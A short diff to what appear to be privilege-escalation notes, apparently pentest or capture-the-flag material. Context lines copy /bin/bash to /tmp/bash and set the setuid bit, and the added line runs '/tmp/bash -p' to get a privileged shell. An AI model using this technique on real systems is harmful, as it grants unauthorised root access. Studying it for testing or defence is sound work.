@@ -217,6 +217,7 @@ void_init(){
 cp /bin/bash /tmp/bash; chmod +s /tmp/bash
 ```
 - Make it executable: `chmod +x script.sh`
+- `/tmp/bash -p`
 - or with Python
 ```python
 #!/usr/bin/python3.9
